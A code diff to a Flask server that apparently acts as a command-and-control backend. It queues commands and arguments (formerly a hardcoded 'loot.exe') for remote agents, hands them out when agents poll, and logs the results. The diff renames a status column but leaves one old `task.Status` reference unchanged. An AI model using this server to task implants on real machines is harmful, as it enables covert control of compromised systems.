@@ -28,8 +28,9 @@ class Task(db.Model):
     job_id = db.Column(db.String)
     command_type = db.Column(db.String)
     cmd = db.Column(db.String)
-    Status = db.Column(db.String)
+    status = db.Column(db.String)
     agent_id = db.Column(db.String)
+    arguments = db.Column(db.String)
 
 def find_agent_by_id(id_):
     return Agent.query.filter_by(agent_id=id_).first()
@@ -39,7 +40,7 @@ def make_job_id():
 @app.route("/tasks/get-jobs")
 def get_jobs():
     tasks = Task.query.all()
-    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.Status, "type": i.command_type,"cmd": i.cmd} for i in tasks]
+    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "command": i.cmd, "status": i.status, "arguments": i.arguments} for i in tasks]
     return jsonify(t)
 
 @app.route("/tasks/create", methods=["POST"])
@@ -52,6 +53,8 @@ def create_task():
     task_type = data.get("type")
     task_command = data.get("cmd")
     agent_id = data.get("agent_id")
+    arguments = data.get("arguments")
+
     agent = find_agent_by_id(agent_id)
     if agent == None:
         return jsonify({"status": "no agent with that ID"})
@@ -59,19 +62,20 @@ def create_task():
         job_id= make_job_id() ,
         command_type = task_type,
         cmd = task_command,
-        Status=CREATED,
-        agent_id= agent_id
+        status=CREATED,
+        agent_id= agent_id,
+        arguments=arguments
     )
     db.session.add(task)
     db.session.commit()
     print(f"[+] A new task has been created for {agent_id}")
-    t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments":"loot.exe" , "status": TASKED}]
-    return t
+    t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "arguments": arguments, "status": TASKED}]
+    return jsonify(t)
 
 @app.route("/tasks/list", methods=["GET"])
 def list_tasks():
     tasks = Task.query.all()
-    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.Status, "type": i.command_type,"cmd": i.cmd} for i in tasks]
+    t = [{"job_id": i.job_id, "agent_id": i.agent_id, "status": i.status, "command": i.cmd, "arguments": i.arguments} for i in tasks]
 
     return render_template(
         'controlCenter.html',
@@ -90,16 +94,17 @@ def tasking():
     job_id = data.get("job_id")
     agent_id = data.get("agent_id")
     task_result = data.get("task_response")
+    output = data.get("output")
     if task_result:
         for response in task_result:
             t_job_id = response.get("job_id")
             t_job_resp = response.get("result")
             task = Task.query.filter_by(job_id = t_job_id).first()
-            if task.Status != TASKED:
+            if task.status != TASKED:
                 print("[+] Possible replay attack!", task)
             else:
                 print(f"[+] Agent responded to job {t_job_id} with result: {t_job_resp}" )
-                task.Status = DONE
+                task.status = DONE
                 db.session.commit()
 
             # we need to set the task to compiled
@@ -120,7 +125,7 @@ def tasking():
         )
         #jsonify({"status": "Bad", "message": "Bad agent!"})
 
-    task = Task.query.filter_by(agent_id=agent_id, Status = CREATED).first()
+    task = Task.query.filter_by(agent_id=agent_id, status = CREATED).first()
     if task == None:
         # no work to be done
 
@@ -129,7 +134,7 @@ def tasking():
         # have tasked the agent
         task.Status = TASKED
         db.session.commit()
-        t = [{ "job_id": task.job_id, "agent_id":agent_id, "command":task_command, "status": TASKED}]
+        t = [{ "job_id": task.job_id, "agent_id":task.agent_id, "command":task.cmd, "status": TASKED, "output": output}]
         return render_template(
             'outPut.html',
             t=t
